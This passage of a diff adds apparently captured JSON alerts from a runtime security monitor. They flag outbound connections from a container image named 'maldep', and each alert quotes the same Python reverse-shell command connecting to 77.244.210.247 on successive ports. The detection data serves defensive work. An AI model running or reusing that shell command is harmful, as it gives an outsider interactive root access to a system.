+      "time": {
+        "seconds": "1764752832",
+        "nanos": 315718995
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:12.315718995: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22899)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:34266->77.244.210.247:22899 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "container.id": "3915af6ed50f",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "container.image.repository": "maldep",
+        "evt.time": "09:07:12.799613458",
+        "fd.name": "0.0.0.0:45254->77.244.210.247:22900",
+        "user.name": "root",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22900)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);"
+      },
+      "time": {
+        "seconds": "1764752832",
+        "nanos": 799613458
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:12.799613458: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22900)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:45254->77.244.210.247:22900 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22901)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "user.name": "root",
+        "container.image.repository": "maldep",
+        "fd.name": "0.0.0.0:51412->77.244.210.247:22901",
+        "container.id": "3915af6ed50f",
+        "evt.time": "09:07:13.274675492"
+      },
+      "time": {
+        "seconds": "1764752833",
+        "nanos": 274675492
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:13.274675492: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22901)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:51412->77.244.210.247:22901 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "evt.time": "09:07:13.627764621",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "container.image.repository": "maldep",
+        "user.name": "root",
+        "fd.name": "0.0.0.0:43640->77.244.210.247:22902",
+        "container.id": "3915af6ed50f",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22902)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);"
+      },
+      "time": {
+        "seconds": "1764752833",
+        "nanos": 627764621
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:13.627764621: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22902)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:43640->77.244.210.247:22902 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "container.id": "3915af6ed50f",
+        "fd.name": "0.0.0.0:43918->77.244.210.247:22903",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22903)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "user.name": "root",
+        "evt.time": "09:07:14.141326990",
+        "container.image.repository": "maldep"
+      },
+      "time": {
+        "seconds": "1764752834",
+        "nanos": 141326990
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:14.141326990: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22903)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:43918->77.244.210.247:22903 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "evt.time": "09:07:14.579040622",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22904)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "user.name": "root",
+        "container.id": "3915af6ed50f",
+        "container.image.repository": "maldep",
+        "fd.name": "0.0.0.0:46972->77.244.210.247:22904",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz"
+      },
+      "time": {
+        "seconds": "1764752834",
+        "nanos": 579040622
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:14.579040622: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22904)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:46972->77.244.210.247:22904 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "evt.time": "09:07:15.041511358",
+        "container.id": "3915af6ed50f",
+        "user.name": "root",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22905)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "container.image.repository": "maldep",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "fd.name": "0.0.0.0:38744->77.244.210.247:22905"
+      },
+      "time": {
+        "seconds": "1764752835",
+        "nanos": 41511358
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:15.041511358: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22905)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:38744->77.244.210.247:22905 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "container.id": "3915af6ed50f",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22906)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "container.image.repository": "maldep",
+        "user.name": "root",
+        "fd.name": "0.0.0.0:38278->77.244.210.247:22906",
+        "evt.time": "09:07:15.383047693"
+      },
+      "time": {
+        "seconds": "1764752835",
+        "nanos": 383047693
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:15.383047693: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22906)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:38278->77.244.210.247:22906 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "user.name": "root",
+        "container.id": "3915af6ed50f",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "fd.name": "0.0.0.0:42030->77.244.210.247:22907",
+        "evt.time": "09:07:15.835711489",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22907)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "container.image.repository": "maldep"
+      },
+      "time": {
+        "seconds": "1764752835",
+        "nanos": 835711489
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:15.835711489: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22907)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:42030->77.244.210.247:22907 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "user.name": "root",
+        "evt.time": "09:07:16.317344630",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "container.id": "3915af6ed50f",
+        "container.image.repository": "maldep",
+        "fd.name": "0.0.0.0:45094->77.244.210.247:22908",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22908)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);"
+      },
+      "time": {
+        "seconds": "1764752836",
+        "nanos": 317344630
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:16.317344630: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22908)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:45094->77.244.210.247:22908 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "user.name": "root",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22909)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "container.id": "3915af6ed50f",
+        "container.image.repository": "maldep",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "evt.time": "09:07:16.712850694",
+        "fd.name": "0.0.0.0:32926->77.244.210.247:22909"
+      },
+      "time": {
+        "seconds": "1764752836",
+        "nanos": 712850694
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:16.712850694: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22909)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:32926->77.244.210.247:22909 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "evt.time": "09:07:18.258344086",
+        "user.name": "root",
+        "container.image.repository": "maldep",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22910)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "container.id": "3915af6ed50f",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "fd.name": "0.0.0.0:41392->77.244.210.247:22910"
+      },
+      "time": {
+        "seconds": "1764752838",
+        "nanos": 258344086
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:18.258344086: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22910)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:41392->77.244.210.247:22910 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "evt.time": "09:07:18.721968353",
+        "container.id": "3915af6ed50f",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22911)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "container.image.repository": "maldep",
+        "user.name": "root",
+        "fd.name": "0.0.0.0:33264->77.244.210.247:22911"
+      },
+      "time": {
+        "seconds": "1764752838",
+        "nanos": 721968353
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:18.721968353: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22911)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:33264->77.244.210.247:22911 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22912)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "fd.name": "0.0.0.0:44890->77.244.210.247:22912",
+        "container.image.repository": "maldep",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "container.id": "3915af6ed50f",
+        "user.name": "root",
+        "evt.time": "09:07:19.086864300"
+      },
+      "time": {
+        "seconds": "1764752839",
+        "nanos": 86864300
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:19.086864300: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22912)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:44890->77.244.210.247:22912 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "container.image.repository": "maldep",
+        "user.name": "root",
+        "evt.time": "09:07:19.523253267",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22913)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "container.id": "3915af6ed50f",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "fd.name": "0.0.0.0:54542->77.244.210.247:22913"
+      },
+      "time": {
+        "seconds": "1764752839",
+        "nanos": 523253267
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:19.523253267: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22913)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:54542->77.244.210.247:22913 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "evt.time": "09:07:19.999848239",
+        "fd.name": "0.0.0.0:43066->77.244.210.247:22914",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22914)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "user.name": "root",
+        "container.image.repository": "maldep",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "container.id": "3915af6ed50f"
+      },
+      "time": {
+        "seconds": "1764752839",
+        "nanos": 999848239
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:19.999848239: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22914)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:43066->77.244.210.247:22914 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22915)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "fd.name": "0.0.0.0:39546->77.244.210.247:22915",
+        "user.name": "root",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "container.id": "3915af6ed50f",
+        "evt.time": "09:07:20.323955910",
+        "container.image.repository": "maldep"
+      },
+      "time": {
+        "seconds": "1764752840",
+        "nanos": 323955910
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:20.323955910: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22915)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:39546->77.244.210.247:22915 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "container.id": "3915af6ed50f",
+        "evt.time": "09:07:20.812040774",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22916)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "container.image.repository": "maldep",
+        "fd.name": "0.0.0.0:36728->77.244.210.247:22916",
+        "user.name": "root"
+      },
+      "time": {
+        "seconds": "1764752840",
+        "nanos": 812040774
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:20.812040774: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22916)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:36728->77.244.210.247:22916 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "fd.name": "0.0.0.0:58940->77.244.210.247:22917",
+        "user.name": "root",
+        "container.image.repository": "maldep",
+        "evt.time": "09:07:21.281657596",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "container.id": "3915af6ed50f",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22917)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);"
+      },
+      "time": {
+        "seconds": "1764752841",
+        "nanos": 281657596
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:21.281657596: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22917)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:58940->77.244.210.247:22917 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22918)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "container.id": "3915af6ed50f",
+        "user.name": "root",
+        "evt.time": "09:07:21.759214894",
+        "fd.name": "0.0.0.0:60916->77.244.210.247:22918",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "container.image.repository": "maldep"
+      },
+      "time": {
+        "seconds": "1764752841",
+        "nanos": 759214894
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:21.759214894: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22918)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:60916->77.244.210.247:22918 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "evt.time": "09:07:22.100882798",
+        "user.name": "root",
+        "container.image.repository": "maldep",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22919)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "container.id": "3915af6ed50f",
+        "fd.name": "0.0.0.0:53472->77.244.210.247:22919"
+      },
+      "time": {
+        "seconds": "1764752842",
+        "nanos": 100882798
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:22.100882798: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22919)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:53472->77.244.210.247:22919 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "evt.time": "09:07:22.561420306",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22920)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "container.id": "3915af6ed50f",
+        "user.name": "root",
+        "container.image.repository": "maldep",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "fd.name": "0.0.0.0:36794->77.244.210.247:22920"
+      },
+      "time": {
+        "seconds": "1764752842",
+        "nanos": 561420306
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
+      "output": "09:07:22.561420306: Notice Disallowed outbound connection destination (command=python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22920)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); connection=0.0.0.0:36794->77.244.210.247:22920 user=root container_id=3915af6ed50f container_name=some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz image=maldep)",
+      "hostname": "vagrant"
+    },
+    {
+      "output_fields": {
+        "evt.time": "09:07:23.044444479",
+        "container.image.repository": "maldep",
+        "fd.name": "0.0.0.0:58460->77.244.210.247:22921",
+        "container.name": "some-container-7304b4d0-6e8c-4254-8357-2c34d02d26d0.tgz",
+        "container.id": "3915af6ed50f",
+        "proc.cmdline": "python3 -c import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"77.244.210.247\",22921)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);",
+        "user.name": "root"
+      },
+      "time": {
+        "seconds": "1764752843",
+        "nanos": 44444479
+      },
+      "priority": "NOTICE",
+      "source": "SYSCALL",
+      "rule": "Unexpected outbound connection destination",
